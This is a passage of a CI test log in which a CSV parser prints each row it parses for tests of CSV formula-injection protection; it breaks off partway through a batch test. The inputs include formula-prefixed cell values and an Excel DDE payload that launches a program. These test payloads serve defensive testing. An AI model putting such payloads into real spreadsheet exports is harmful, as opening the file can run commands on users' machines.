2025-11-18T17:36:03.4545808Z }
2025-11-18T17:36:03.4547744Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:36:03.4548537Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.4549024Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.4550496Z   cellValues: [ [32m'test@example.com'[39m, [32m'=SUM(A1:A10)'[39m, [32m'Normal'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.4551171Z   columnMapping: {
2025-11-18T17:36:03.4551552Z     email: [33m0[39m,
2025-11-18T17:36:03.4552115Z     firstName: [33m1[39m,
2025-11-18T17:36:03.4552556Z     lastName: [33m2[39m,
2025-11-18T17:36:03.4552971Z     role: [33m3[39m,
2025-11-18T17:36:03.4553335Z     rut: [33m-1[39m,
2025-11-18T17:36:03.4553734Z     password: [33m-1[39m
2025-11-18T17:36:03.4554062Z   }
2025-11-18T17:36:03.4554312Z }
2025-11-18T17:36:03.4554669Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.4555206Z   email: [32m'test@example.com'[39m,
2025-11-18T17:36:03.4555729Z   firstName: [32m'=SUM(A1:A10)'[39m,
2025-11-18T17:36:03.4556213Z   lastName: [32m'Normal'[39m,
2025-11-18T17:36:03.4556662Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.4557394Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.4557778Z }
2025-11-18T17:36:03.4557938Z 
2025-11-18T17:36:03.4559892Z [90mstdout[2m | __tests__/utils/csvInjectionCore.test.ts[2m > [22m[2mCSV Injection Protection - Core Functionality[2m > [22m[2mFormula Prevention[2m > [22m[2mshould escape plus sign at start of field[22m[39m
2025-11-18T17:36:03.4578546Z [CSV-PARSER] Column detection: {
2025-11-18T17:36:03.4581074Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:36:03.4583093Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:36:03.4584269Z }
2025-11-18T17:36:03.4586654Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:36:03.4591255Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.4591749Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.4592651Z   cellValues: [ [32m'test@example.com'[39m, [32m'+SUM(A1:A10)'[39m, [32m'Normal'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.4593344Z   columnMapping: {
2025-11-18T17:36:03.4593717Z     email: [33m0[39m,
2025-11-18T17:36:03.4594105Z     firstName: [33m1[39m,
2025-11-18T17:36:03.4594507Z     lastName: [33m2[39m,
2025-11-18T17:36:03.4594887Z     role: [33m3[39m,
2025-11-18T17:36:03.4595216Z     rut: [33m-1[39m,
2025-11-18T17:36:03.4595565Z     password: [33m-1[39m
2025-11-18T17:36:03.4595879Z   }
2025-11-18T17:36:03.4596143Z }
2025-11-18T17:36:03.4596505Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.4597329Z   email: [32m'test@example.com'[39m,
2025-11-18T17:36:03.4597954Z   firstName: [32m'+SUM(A1:A10)'[39m,
2025-11-18T17:36:03.4598464Z   lastName: [32m'Normal'[39m,
2025-11-18T17:36:03.4598918Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.4599380Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.4599725Z }
2025-11-18T17:36:03.4600076Z 
2025-11-18T17:36:03.4601733Z [90mstdout[2m | __tests__/utils/csvInjectionCore.test.ts[2m > [22m[2mCSV Injection Protection - Core Functionality[2m > [22m[2mFormula Prevention[2m > [22m[2mshould escape minus sign at start of field[22m[39m
2025-11-18T17:36:03.4603118Z [CSV-PARSER] Column detection: {
2025-11-18T17:36:03.4603982Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:36:03.4605153Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:36:03.4605812Z }
2025-11-18T17:36:03.4607212Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:36:03.4608136Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.4608573Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.4609466Z   cellValues: [ [32m'test@example.com'[39m, [32m'-SUM(A1:A10)'[39m, [32m'Normal'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.4610145Z   columnMapping: {
2025-11-18T17:36:03.4610512Z     email: [33m0[39m,
2025-11-18T17:36:03.4610894Z     firstName: [33m1[39m,
2025-11-18T17:36:03.4611294Z     lastName: [33m2[39m,
2025-11-18T17:36:03.4611695Z     role: [33m3[39m,
2025-11-18T17:36:03.4612051Z     rut: [33m-1[39m,
2025-11-18T17:36:03.4612421Z     password: [33m-1[39m
2025-11-18T17:36:03.4612743Z   }
2025-11-18T17:36:03.4612993Z }
2025-11-18T17:36:03.4613350Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.4613866Z   email: [32m'test@example.com'[39m,
2025-11-18T17:36:03.4614395Z   firstName: [32m'-SUM(A1:A10)'[39m,
2025-11-18T17:36:03.4614902Z   lastName: [32m'Normal'[39m,
2025-11-18T17:36:03.4615341Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.4615800Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.4616147Z }
2025-11-18T17:36:03.4616303Z 
2025-11-18T17:36:03.4618089Z [90mstdout[2m | __tests__/utils/csvInjectionCore.test.ts[2m > [22m[2mCSV Injection Protection - Core Functionality[2m > [22m[2mFormula Prevention[2m > [22m[2mshould escape at sign at start of field[22m[39m
2025-11-18T17:36:03.4619425Z [CSV-PARSER] Column detection: {
2025-11-18T17:36:03.4620342Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:36:03.4621505Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:36:03.4622186Z }
2025-11-18T17:36:03.4623466Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:36:03.4624676Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.4625142Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.4626044Z   cellValues: [ [32m'test@example.com'[39m, [32m'@SUM(A1:A10)'[39m, [32m'Normal'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.4626954Z   columnMapping: {
2025-11-18T17:36:03.4627577Z     email: [33m0[39m,
2025-11-18T17:36:03.4628028Z     firstName: [33m1[39m,
2025-11-18T17:36:03.4628494Z     lastName: [33m2[39m,
2025-11-18T17:36:03.4628918Z     role: [33m3[39m,
2025-11-18T17:36:03.4629346Z     rut: [33m-1[39m,
2025-11-18T17:36:03.4629747Z     password: [33m-1[39m
2025-11-18T17:36:03.4630086Z   }
2025-11-18T17:36:03.4630327Z }
2025-11-18T17:36:03.4630678Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.4631234Z   email: [32m'test@example.com'[39m,
2025-11-18T17:36:03.4631813Z   firstName: [32m'@SUM(A1:A10)'[39m,
2025-11-18T17:36:03.4632355Z   lastName: [32m'Normal'[39m,
2025-11-18T17:36:03.4632814Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.4633303Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.4633675Z }
2025-11-18T17:36:03.4633826Z 
2025-11-18T17:36:03.4636019Z [90mstdout[2m | __tests__/utils/csvInjectionCore.test.ts[2m > [22m[2mCSV Injection Protection - Core Functionality[2m > [22m[2mFormula Prevention[2m > [22m[2mshould not escape formula characters in middle of field[22m[39m
2025-11-18T17:36:03.4637837Z [CSV-PARSER] Column detection: {
2025-11-18T17:36:03.4638822Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:36:03.4640123Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:36:03.4640853Z }
2025-11-18T17:36:03.4642187Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:36:03.4643119Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.4643589Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.4644511Z   cellValues: [ [32m'test@example.com'[39m, [32m'John=Doe'[39m, [32m'Smith+Johnson'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.4645253Z   columnMapping: {
2025-11-18T17:36:03.4645645Z     email: [33m0[39m,
2025-11-18T17:36:03.4646037Z     firstName: [33m1[39m,
2025-11-18T17:36:03.4646460Z     lastName: [33m2[39m,
2025-11-18T17:36:03.4647149Z     role: [33m3[39m,
2025-11-18T17:36:03.4647551Z     rut: [33m-1[39m,
2025-11-18T17:36:03.4647937Z     password: [33m-1[39m
2025-11-18T17:36:03.4648271Z   }
2025-11-18T17:36:03.4648521Z }
2025-11-18T17:36:03.4648887Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.4649415Z   email: [32m'test@example.com'[39m,
2025-11-18T17:36:03.4649944Z   firstName: [32m'John=Doe'[39m,
2025-11-18T17:36:03.4650460Z   lastName: [32m'Smith+Johnson'[39m,
2025-11-18T17:36:03.4650931Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.4651398Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.4651757Z }
2025-11-18T17:36:03.4651907Z 
2025-11-18T17:36:03.4653670Z [90mstdout[2m | __tests__/utils/csvInjectionCore.test.ts[2m > [22m[2mCSV Injection Protection - Core Functionality[2m > [22m[2mReal-world Attack Vectors[2m > [22m[2mshould protect against Excel DDE injection[22m[39m
2025-11-18T17:36:03.4655100Z [CSV-PARSER] Column detection: {
2025-11-18T17:36:03.4656018Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:36:03.4657372Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:36:03.4658118Z }
2025-11-18T17:36:03.4659390Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:36:03.4660333Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.4660994Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.4661931Z   cellValues: [ [32m'evil@hacker.com'[39m, [32m"=cmd|'/c calc'!A0"[39m, [32m'Victim'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.4662658Z   columnMapping: {
2025-11-18T17:36:03.4663060Z     email: [33m0[39m,
2025-11-18T17:36:03.4663467Z     firstName: [33m1[39m,
2025-11-18T17:36:03.4663883Z     lastName: [33m2[39m,
2025-11-18T17:36:03.4664291Z     role: [33m3[39m,
2025-11-18T17:36:03.4664673Z     rut: [33m-1[39m,
2025-11-18T17:36:03.4665077Z     password: [33m-1[39m
2025-11-18T17:36:03.4665413Z   }
2025-11-18T17:36:03.4665672Z }
2025-11-18T17:36:03.4666044Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.4666600Z   email: [32m'evil@hacker.com'[39m,
2025-11-18T17:36:03.4667472Z   firstName: [32m"=cmd|'/c calc'!A0"[39m,
2025-11-18T17:36:03.4668029Z   lastName: [32m'Victim'[39m,
2025-11-18T17:36:03.4668478Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.4668957Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.4669348Z }
2025-11-18T17:36:03.4669501Z 
2025-11-18T17:36:03.4671423Z [90mstdout[2m | __tests__/utils/csvInjectionCore.test.ts[2m > [22m[2mCSV Injection Protection - Core Functionality[2m > [22m[2mReal-world Attack Vectors[2m > [22m[2mshould protect against CSV formula injection in all fields[22m[39m
2025-11-18T17:36:03.4672963Z [CSV-PARSER] Column detection: {
2025-11-18T17:36:03.4674079Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:36:03.4675318Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:36:03.4676014Z }
2025-11-18T17:36:03.4677485Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:36:03.4678445Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.4678900Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.4679813Z   cellValues: [ [32m'=evil@hacker.com'[39m, [32m'+EVIL()'[39m, [32m'@MALICIOUS()'[39m, [32m'=admin'[39m ],
2025-11-18T17:36:03.4680553Z   columnMapping: {
2025-11-18T17:36:03.4680961Z     email: [33m0[39m,
2025-11-18T17:36:03.4681367Z     firstName: [33m1[39m,
2025-11-18T17:36:03.4681790Z     lastName: [33m2[39m,
2025-11-18T17:36:03.4682194Z     role: [33m3[39m,
2025-11-18T17:36:03.4682580Z     rut: [33m-1[39m,
2025-11-18T17:36:03.4682983Z     password: [33m-1[39m
2025-11-18T17:36:03.4683321Z   }
2025-11-18T17:36:03.4683577Z }
2025-11-18T17:36:03.4683943Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.4684474Z   email: [32m'=evil@hacker.com'[39m,
2025-11-18T17:36:03.4684999Z   firstName: [32m'+EVIL()'[39m,
2025-11-18T17:36:03.4685524Z   lastName: [32m'@MALICIOUS()'[39m,
2025-11-18T17:36:03.4685991Z   role: [32m'=admin'[39m,
2025-11-18T17:36:03.4686460Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.4687072Z }
2025-11-18T17:36:03.4687238Z 
2025-11-18T17:36:03.4689114Z [90mstdout[2m | __tests__/utils/csvInjectionCore.test.ts[2m > [22m[2mCSV Injection Protection - Core Functionality[2m > [22m[2mReal-world Attack Vectors[2m > [22m[2mshould handle quoted fields with formula injection[22m[39m
2025-11-18T17:36:03.4690598Z [CSV-PARSER] Column detection: {
2025-11-18T17:36:03.4691505Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:36:03.4692724Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:36:03.4693399Z }
2025-11-18T17:36:03.4694664Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:36:03.4695605Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.4696033Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.4697141Z   cellValues: [ [32m'test@example.com'[39m, [32m'=SUM(A1:A10)'[39m, [32m'Normal Name'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.4698158Z   columnMapping: {
2025-11-18T17:36:03.4698566Z     email: [33m0[39m,
2025-11-18T17:36:03.4698951Z     firstName: [33m1[39m,
2025-11-18T17:36:03.4699389Z     lastName: [33m2[39m,
2025-11-18T17:36:03.4699805Z     role: [33m3[39m,
2025-11-18T17:36:03.4700185Z     rut: [33m-1[39m,
2025-11-18T17:36:03.4700581Z     password: [33m-1[39m
2025-11-18T17:36:03.4700922Z   }
2025-11-18T17:36:03.4701195Z }
2025-11-18T17:36:03.4701554Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.4702106Z   email: [32m'test@example.com'[39m,
2025-11-18T17:36:03.4702663Z   firstName: [32m'=SUM(A1:A10)'[39m,
2025-11-18T17:36:03.4703194Z   lastName: [32m'Normal Name'[39m,
2025-11-18T17:36:03.4703714Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.4704208Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.4704580Z }
2025-11-18T17:36:03.4704725Z 
2025-11-18T17:36:03.4706533Z [90mstdout[2m | __tests__/utils/csvInjectionCore.test.ts[2m > [22m[2mCSV Injection Protection - Core Functionality[2m > [22m[2mPerformance and Edge Cases[2m > [22m[2mshould handle empty fields without errors[22m[39m
2025-11-18T17:36:03.4708290Z [CSV-PARSER] Column detection: {
2025-11-18T17:36:03.4709270Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:36:03.4710806Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:36:03.4711529Z }
2025-11-18T17:36:03.4712904Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:36:03.4713893Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.4714330Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.4715161Z   cellValues: [ [32m'test@example.com'[39m, [32m''[39m, [32m''[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.4715818Z   columnMapping: {
2025-11-18T17:36:03.4716240Z     email: [33m0[39m,
2025-11-18T17:36:03.4716660Z     firstName: [33m1[39m,
2025-11-18T17:36:03.4717337Z     lastName: [33m2[39m,
2025-11-18T17:36:03.4717771Z     role: [33m3[39m,
2025-11-18T17:36:03.4718164Z     rut: [33m-1[39m,
2025-11-18T17:36:03.4718576Z     password: [33m-1[39m
2025-11-18T17:36:03.4718924Z   }
2025-11-18T17:36:03.4719196Z }
2025-11-18T17:36:03.4719580Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.4720201Z   email: [32m'test@example.com'[39m,
2025-11-18T17:36:03.4720717Z   firstName: [32m''[39m,
2025-11-18T17:36:03.4721137Z   lastName: [32m''[39m,
2025-11-18T17:36:03.4721561Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.4722051Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.4722420Z }
2025-11-18T17:36:03.4722572Z 
2025-11-18T17:36:03.4724559Z [90mstdout[2m | __tests__/utils/csvInjectionCore.test.ts[2m > [22m[2mCSV Injection Protection - Core Functionality[2m > [22m[2mPerformance and Edge Cases[2m > [22m[2mshould handle large formula injections efficiently[22m[39m
2025-11-18T17:36:03.4726149Z [CSV-PARSER] Column detection: {
2025-11-18T17:36:03.4727448Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:36:03.4728751Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:36:03.4729455Z }
2025-11-18T17:36:03.4730790Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:36:03.4731784Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.4732315Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.4732704Z   cellValues: [
2025-11-18T17:36:03.4733188Z     [32m'test@example.com'[39m,
2025-11-18T17:36:03.4771400Z     [32m'=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'[39m,
2025-11-18T17:36:03.4808524Z     [32m'Normal'[39m,
2025-11-18T17:36:03.4808975Z     [32m'docente'[39m
2025-11-18T17:36:03.4809310Z   ],
2025-11-18T17:36:03.4809598Z   columnMapping: {
2025-11-18T17:36:03.4810000Z     email: [33m0[39m,
2025-11-18T17:36:03.4810453Z     firstName: [33m1[39m,
2025-11-18T17:36:03.4810922Z     lastName: [33m2[39m,
2025-11-18T17:36:03.4811367Z     role: [33m3[39m,
2025-11-18T17:36:03.4811796Z     rut: [33m-1[39m,
2025-11-18T17:36:03.4812245Z     password: [33m-1[39m
2025-11-18T17:36:03.4812627Z   }
2025-11-18T17:36:03.4812901Z }
2025-11-18T17:36:03.4813289Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.4814116Z   email: [32m'test@example.com'[39m,
2025-11-18T17:36:03.4853092Z   firstName: [32m'=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'[39m,
2025-11-18T17:36:03.4889935Z   lastName: [32m'Normal'[39m,
2025-11-18T17:36:03.4890449Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.4890964Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.4891354Z }
2025-11-18T17:36:03.4891523Z 
2025-11-18T17:36:03.4893506Z [90mstdout[2m | __tests__/utils/csvInjectionCore.test.ts[2m > [22m[2mCSV Injection Protection - Core Functionality[2m > [22m[2mPerformance and Edge Cases[2m > [22m[2mshould process multiple formula injections in batch[22m[39m
2025-11-18T17:36:03.4895156Z [CSV-PARSER] Column detection: {
2025-11-18T17:36:03.4896173Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:36:03.4897676Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:36:03.4898490Z }
2025-11-18T17:36:03.4899897Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:36:03.4900934Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.4901444Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.4902406Z   cellValues: [ [32m'user0@example.com'[39m, [32m'=EVIL0'[39m, [32m'+BAD0'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.4903177Z   columnMapping: {
2025-11-18T17:36:03.4903613Z     email: [33m0[39m,
2025-11-18T17:36:03.4904061Z     firstName: [33m1[39m,
2025-11-18T17:36:03.4904520Z     lastName: [33m2[39m,
2025-11-18T17:36:03.4905239Z     role: [33m3[39m,
2025-11-18T17:36:03.4905675Z     rut: [33m-1[39m,
2025-11-18T17:36:03.4906107Z     password: [33m-1[39m
2025-11-18T17:36:03.4906486Z   }
2025-11-18T17:36:03.4906971Z }
2025-11-18T17:36:03.4907386Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.4908020Z   email: [32m'user0@example.com'[39m,
2025-11-18T17:36:03.4908599Z   firstName: [32m'=EVIL0'[39m,
2025-11-18T17:36:03.4909131Z   lastName: [32m'+BAD0'[39m,
2025-11-18T17:36:03.4909619Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.4910157Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.4910561Z }
2025-11-18T17:36:03.4910936Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.4911454Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.4912415Z   cellValues: [ [32m'user1@example.com'[39m, [32m'=EVIL1'[39m, [32m'+BAD1'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.4913183Z   columnMapping: {
2025-11-18T17:36:03.4913637Z     email: [33m0[39m,
2025-11-18T17:36:03.4914086Z     firstName: [33m1[39m,
2025-11-18T17:36:03.4914602Z     lastName: [33m2[39m,
2025-11-18T17:36:03.4915031Z     role: [33m3[39m,
2025-11-18T17:36:03.4915487Z     rut: [33m-1[39m,
2025-11-18T17:36:03.4915895Z     password: [33m-1[39m
2025-11-18T17:36:03.4916246Z   }
2025-11-18T17:36:03.4916505Z }
2025-11-18T17:36:03.4917177Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.4917768Z   email: [32m'user1@example.com'[39m,
2025-11-18T17:36:03.4918597Z   firstName: [32m'=EVIL1'[39m,
2025-11-18T17:36:03.4919177Z   lastName: [32m'+BAD1'[39m,
2025-11-18T17:36:03.4919668Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.4920185Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.4920555Z }
2025-11-18T17:36:03.4920887Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.4921364Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.4922324Z   cellValues: [ [32m'user2@example.com'[39m, [32m'=EVIL2'[39m, [32m'+BAD2'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.4923023Z   columnMapping: {
2025-11-18T17:36:03.4923431Z     email: [33m0[39m,
2025-11-18T17:36:03.4923848Z     firstName: [33m1[39m,
2025-11-18T17:36:03.4924268Z     lastName: [33m2[39m,
2025-11-18T17:36:03.4924662Z     role: [33m3[39m,
2025-11-18T17:36:03.4925043Z     rut: [33m-1[39m,
2025-11-18T17:36:03.4925438Z     password: [33m-1[39m
2025-11-18T17:36:03.4925785Z   }
2025-11-18T17:36:03.4926037Z }
2025-11-18T17:36:03.4926427Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.4927222Z   email: [32m'user2@example.com'[39m,
2025-11-18T17:36:03.4927734Z   firstName: [32m'=EVIL2'[39m,
